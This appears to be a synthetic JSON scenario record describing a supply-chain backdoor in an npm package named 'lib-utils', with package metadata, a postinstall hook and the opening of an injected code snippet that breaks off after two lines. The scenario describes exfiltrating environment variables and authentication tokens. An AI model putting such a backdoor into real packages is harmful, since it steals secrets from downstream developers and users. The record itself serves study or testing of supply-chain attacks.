[{"scenario": "Compromise of a widely-used open-source JavaScript library by injecting a malicious backdoor in the published NPM package, which then exfiltrates environment variables and authentication tokens from downstream applications that import the compromised version.", "technical_data": {"npm_package_integrity": {"package_name": "lib-utils", "version": "3.2.1", "published_time": "2024-05-12T14:22:10Z", "sha512": "zKx+P9H5NQbBz+OM+FqL6KDxM7mq3JmJHwH+Y0u+4Jv1h6QX3zF7M9V7Z7i1e6t9n4XfGzY7vRWy0uM+F6x4B7Q==", "package_json": {"name": "lib-utils", "version": "3.2.1", "main": "index.js", "scripts": {"postinstall": "node scripts/postinstall.js"}, "dependencies": {}}}, "malicious_code_snippet": {"file": "index.js", "injected_code": "const http = require('http');
const originalFunction = module.exports.someUtilityFunction;

